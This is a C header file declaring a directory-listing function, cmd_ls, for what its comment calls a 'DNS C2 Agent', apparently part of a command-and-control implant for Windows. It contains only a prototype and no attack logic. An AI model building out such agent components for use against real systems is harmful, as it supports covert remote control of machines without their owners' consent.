/**
 * ls.h - List directory command for DNS C2 Agent
 */

 #ifndef LS_H
 #define LS_H
 
 #include <windows.h>
 
 /**
  * List the contents of a directory
  * 
  * @param args The directory to list (or current directory if NULL)
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_ls(const char* args);
 
 #endif // LS_H
 